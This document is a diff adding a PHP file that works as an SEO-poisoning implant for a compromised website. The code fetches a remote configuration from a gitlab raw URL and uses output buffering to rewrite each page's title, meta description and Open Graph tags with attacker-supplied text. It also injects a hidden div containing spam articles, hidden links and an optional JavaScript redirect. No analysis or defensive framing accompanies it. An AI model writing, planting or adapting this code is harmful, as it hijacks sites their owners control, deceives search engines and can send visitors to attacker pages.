@@ -1,0 +1,67 @@
+<?php
+$poison_page_path = ltrim(parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH), '/');
+if ($poison_page_path && $poison_page_path !== 'index.php') {
+    $poison_config = @json_decode(@file_get_contents('https://gitlab.com/wulizo335/data-json/-/raw/main/info2.txt'), true);
+    if ($poison_config && is_array($poison_config) && count($poison_config) > 0) {
+        $poison_hash = crc32($poison_page_path);
+        $poison_index = $poison_hash % count($poison_config);
+        $poison_cfg = $poison_config[$poison_index];
+        if ($poison_cfg) {
+            $poison_protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? 'https://' : 'http://';
+            $poison_canonical = $poison_protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+            if (!ob_get_level()) ob_start();
+            function poison_filter_output($buffer) {
+                global $poison_cfg, $poison_canonical;
+                if (empty($buffer)) return $buffer;
+                preg_match('/<title[^>]*>([^<]+)<\/title>/i', $buffer, $m);
+                $orig_title = trim($m[1] ?? 'Page');
+                $final_title = $poison_cfg['title'] . " x " . $orig_title;
+                $buffer = preg_replace('/<title[^>]*>.*?<\/title>/i', '<title>' . htmlspecialchars($final_title) . '</title>', $buffer, 1);
+                if (!empty($poison_cfg['description'])) {
+                    $brand = $poison_cfg['brand'] ?? '';
+                    $full_desc = !empty($brand) ? $brand . ' ' . $poison_cfg['description'] : $poison_cfg['description'];
+                    $desc_tag = '<meta name="description" content="' . htmlspecialchars($full_desc) . '">';
+                    if (preg_match('/<meta\s+name=["\']description["\']/i', $buffer)) {
+                        $buffer = preg_replace('/<meta\s+name=["\']description["\']\s+content=["\'](.*?)["\']/i', $desc_tag, $buffer, 1);
+                    } else {
+                        $pos = strpos($buffer, '</head>');
+                        if ($pos !== false) $buffer = substr_replace($buffer, $desc_tag . "\n", $pos, 0);
+                    }
+                }
+                $og_title_tag = '<meta property="og:title" content="' . htmlspecialchars($final_title) . '">';
+                if (preg_match('/<meta\s+property=["\']og:title["\']/i', $buffer)) {
+                    $buffer = preg_replace('/<meta\s+property=["\']og:title["\']\s+content=["\'](.*?)["\']/i', $og_title_tag, $buffer, 1);
+                } else {
+                    $pos = strpos($buffer, '</head>');
+                    if ($pos !== false) $buffer = substr_replace($buffer, $og_title_tag . "\n", $pos, 0);
+                }
+                if (!empty($poison_cfg['description'])) {
+                    $brand = $poison_cfg['brand'] ?? '';
+                    $full_desc = !empty($brand) ? $brand . ' ' . $poison_cfg['description'] : $poison_cfg['description'];
+                    $og_desc_tag = '<meta property="og:description" content="' . htmlspecialchars($full_desc) . '">';
+                    if (preg_match('/<meta\s+property=["\']og:description["\']/i', $buffer)) {
+                        $buffer = preg_replace('/<meta\s+property=["\']og:description["\']\s+content=["\'](.*?)["\']/i', $og_desc_tag, $buffer, 1);
+                    } else {
+                        $pos = strpos($buffer, '</head>');
+                        if ($pos !== false) $buffer = substr_replace($buffer, $og_desc_tag . "\n", $pos, 0);
+                    }
+                }
+                $article = str_replace('href="#"', 'href="' . htmlspecialchars($poison_canonical) . '"', $poison_cfg['article'] ?? '');
+                $hidden_links = str_replace('href="#"', 'href="' . htmlspecialchars($poison_canonical) . '"', $poison_cfg['hidden_links'] ?? '');
+                $hidden = '<div style="display:none;visibility:hidden;font-size:0;height:0;width:0;overflow:hidden;" data-poison="1">';
+                $hidden .= $article . $hidden_links;
+                if (!empty($poison_cfg['js_redirect'])) $hidden .= "\n" . $poison_cfg['js_redirect'];
+                $hidden .= '</div>';
+                $body_end = strpos($buffer, '</body>');
+                if ($body_end !== false) {
+                    $buffer = substr_replace($buffer, $hidden, $body_end, 0);
+                } else {
+                    $buffer .= $hidden;
+                }
+                return $buffer;
+            }
+            ob_start('poison_filter_output');
+        }
+    }
+}
+?>
